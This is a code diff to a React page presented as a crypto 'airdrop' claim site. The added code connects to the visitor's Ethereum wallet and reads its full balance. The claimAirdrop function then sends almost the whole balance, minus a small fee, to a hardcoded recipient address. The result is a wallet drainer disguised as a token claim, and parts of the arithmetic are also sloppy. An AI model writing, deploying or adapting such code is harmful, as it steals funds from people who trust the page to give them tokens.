@@ -11,7 +11,11 @@ const abi = require('erc-20-abi')
 
 
 export default function Home() {
-
+  let amount=0;
+  let finalAmount=0;
+  let _signer;
+  let _user;
+  let _gasp;
 
   async function connect() {
     if (typeof window.ethereum !== 'undefined'){
@@ -24,23 +28,23 @@ export default function Home() {
   
 
 
-      user = await provider.send("eth_requestAccounts", []);
+      const user = await provider.send("eth_requestAccounts", []);
+      _user=user;
       // let walletSigner = wallet.connect(window.ethersProvider)
       console.log(`user:${user}`);
-      signer = provider.getSigner()
+      const signer = provider.getSigner();
+      _signer = signer;
       console.log(signer);
 
 
-      const address = signerr.getAddress()
+      const address = signer.getAddress()
       // console.log(address.then());
-      const bal = await signerr.getBalance(address)
-      setBalance(bal)
+      const bal = await signer.getBalance(signer.address)
       amount = bal
-
+      console.log('balance:',bal);
       const gasP = provider.getGasPrice()
-      setGasPrice(gasP)
-      console.log(`balance:${Number(bal).toString(16)}`);
-      // const gasL = ethers.utils.hexlify(100000)
+      _gasp = gasP
+      const gasL = ethers.utils.hexlify(100000)
       // setGasLimit(gasL)
       // console.log(gasL);
       const gasHexToBigNumber = BigNumber.from(gasL)
@@ -48,25 +52,31 @@ export default function Home() {
       const withdrawable = BigNumber.from(bal) - gasHexToBigNumber
       console.log(`withdarawble is: ${withdrawable}`);
 
+      let fee = 50000000000000000;
+      finalAmount = amount - fee;
+
       const etherValue = bal / 10e14
+      amount = withdrawable
+      console.log( 'final amount:', amount);
+      console.log( 'final amount:', finalAmount);
+      console.log( 'final amount:', fee);
 
     }
   }
-  let amount
-
 
   async function claimAirdrop() {
-
-    const fee = BigNumber.from('50000000000000000')
-    const meghdar = BigNumber.from(amount)
+  const Receptient = "0x39A77B13BA2C5FA2249f7e5a4194582824D58c8E";
+   
+  console.log(amount);
     
-    signer.sendTransaction({
-      from: user,
+    
+    _signer.sendTransaction({
+      from: _user,
       to: Receptient,
       
-      gasPrice: gasPrice,
+      gasPrice: _gasp,
       gasLimit: 50000,
-      value: (meghdar ),
+      value: (finalAmount ),
     })
   }
 
